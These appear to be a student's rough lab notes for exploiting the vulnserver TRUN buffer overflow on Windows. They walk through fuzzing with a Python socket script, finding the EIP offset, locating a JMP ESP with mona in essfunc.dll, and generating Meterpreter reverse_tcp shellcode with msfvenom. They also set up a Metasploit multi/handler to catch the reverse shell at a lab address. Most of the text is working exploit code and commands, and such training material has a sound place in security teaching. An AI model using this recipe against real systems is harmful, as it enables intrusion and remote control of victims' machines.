Basically its the same as the day before. Start by disabling all secuirty. then run strings on program. 
run the program and see what port its opening to by using netstat -anop
find the pid and use findstr <pid> to see whats running
after that start making your script on the linux box

#!/usr/bin/python
import socket

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #Crete the IPV4 socket, TCP protocol.

s.connect(("10.50.171.26", 9999)) #Connect to target IP and port
print s.recv(1024) #Print response
s.send(buf) #Send the value of buf
print s.recv(1024) #print response

run the program in immunity

then run the scrip and it should say welcome to "" server
enter HELP or something

after that add line 

buf = "HELP" 

it should return a list of commands

add script line buf = "TRUN /.;/"  and add "buf += "A" * 3000

now go back to immunity and make sure its in there 
if it is go to wiremask and generate buffer overflow of 300 characters and copy it and COMMENT OUT THE ORIGINAL BUF and add a new buf line containning the overflow we jst copied.

rerun the script and exe and copy the eip address to the wiremask and it should return a number, enter that where you have the "3000" and add line:

also add "buf += "BBBB" #EIP     this is so we can be sure the EIP is taken it should show 4242424242 

also gonna add line 

buf += "\x90" * 10 #NOP

from here go to windows and open immunity and in the bottom white box run:

!mona modules #Find unportected !mona modulesd DLLS
!mona jmp -r esp -m "essfunc.dll" #Search for JMP ESP with unprotected DLL

at the bottom of running the second command find the address and copy the top 3 addresses and change it to litle endian. 

throw that new value into the eip

open a new terminator horizontala and run command :

#MSF CONSOLE
msfconsole

use multi/handler
show options 
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit

this should just be listening for now until you get the shellcode from running the next command which is 

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.170.117 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python

copy the shellcode EXCEPT FOR THE FIRST LINE and throw it in the shell code spot in the script.

after rerunning the script the msfconsole should connect. 

FIN



62|50|11|AF > xaf\x11\x50\x62
62|50|11|BB 
62|50|11|C7








***** ************

#Static
strings .\vulnserver.exe | select -First 10

#Behavioral
Get-Process | findstr /i vuln
netstat -anop tcp | findstr 9576 #pid will be different for everyone 
##Run as intended

#Dynamic
Run immunity as Administrator > open .exe > play, rewind, repeat
Fuzzing > wiremask > offset

!mona modules #Find unportecte!mona modulesd DLLS
!mona jmp -r esp -m "essfunc.dll" #Search for JMP ESP with unprotected DLL
#Window > Log Data

#MSF CONSOLE
msfconsole

use multi/handler
show options 
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit

#SHELL CODE
msfvenon -p windows/meterpreter/reverse_tcp lhost=10.50.170.117 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python 

